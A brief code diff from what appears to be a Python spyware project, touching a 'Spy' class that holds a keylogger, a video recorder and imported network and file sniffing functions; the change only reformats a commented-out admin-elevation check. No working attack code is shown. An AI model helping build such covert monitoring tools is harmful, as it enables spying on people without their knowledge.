@@ -12,7 +12,7 @@ from spying.snnifing import netstart, filestart, stop_sniffing
 
 class Spy:
     def __init__(self):
-        #if not admin.make_admin():
+        # if not admin.make_admin():
         #    exit()
         self.keyLogger: Optional[KeyLogger] = None
         self.video_recorder: Optional[VideoRecorder] = None
